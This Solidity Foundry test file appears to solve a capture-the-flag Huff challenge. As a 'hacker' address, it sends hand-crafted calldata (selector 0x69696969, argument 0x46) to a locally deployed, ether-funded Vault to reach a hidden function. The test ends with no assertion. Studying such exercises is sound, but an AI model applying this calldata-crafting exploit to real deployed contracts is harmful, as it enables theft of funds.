// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";

interface Vault {
    function setOwner(address) external returns (bool);
    function deposit() external;
    function withdraw() external;
}

contract SolutionTest is Test {
    Vault public vault;

    address constant hacker = payable(address(0xbadbabe));

    function setUp() public {
        vault = Vault(HuffDeployer.config().with_value(111 ether).deploy{value: 111 ether}("Vault"));
        vm.deal(hacker, 0.2 ether); // give the hacker a little beer money
    }

    function testHack() public {
        // Try sending 0x69696969 as first 4 bytes to trigger to get into NOT_A_RUG_PULL()
        // and then send 0x46 as the calldata so that it will get past the loop
        bytes memory payload = abi.encodePacked(uint(0x6969696900000000000000000000000000000000000000000000000000000000), uint(0x0000004600000000000000000000000000000000000000000000000000000000));
        // Note: When the two words above (0x69696969 right padded and 0x46 right padded offset by 4 bytes) are placed side by side
        // then CALLDATA location 0x00 - 0x04 will contain exactly 0x69696969 and 0x04 - 0x24 contains a fully left padded 0x46
        // In the EVM, "values" are always left padded.
        vm.startPrank(hacker);
        (bool success, bytes memory returnData) = address(vault).call{value: 0.001 ether}(payload);
    }

}

